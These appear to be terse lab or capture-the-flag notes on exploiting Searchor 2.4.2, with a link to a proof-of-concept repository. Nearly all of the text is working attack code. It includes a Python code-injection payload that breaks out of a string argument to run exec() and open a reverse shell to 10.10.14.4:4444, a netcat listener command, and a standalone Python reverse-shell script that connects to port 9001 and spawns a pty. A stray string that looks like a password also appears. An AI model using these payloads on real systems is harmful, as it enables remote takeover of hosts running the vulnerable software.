[https://github.com/jonnyzar/POC-Searchor-2.4.2](https://github.com/jonnyzar/POC-Searchor-2.4.2)

  

', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.4',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

  

  

nc -lvnp 4444

  

jh1usoih2bkjaspwe92

  

#!/usr/bin/python3

import socket

import subprocess

import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(("10.10.14.4",9001))

os.dup2(s.fileno(),0)

os.dup2(s.fileno(),1)

os.dup2(s.fileno(),2)

import pty

pty.spawn("sh")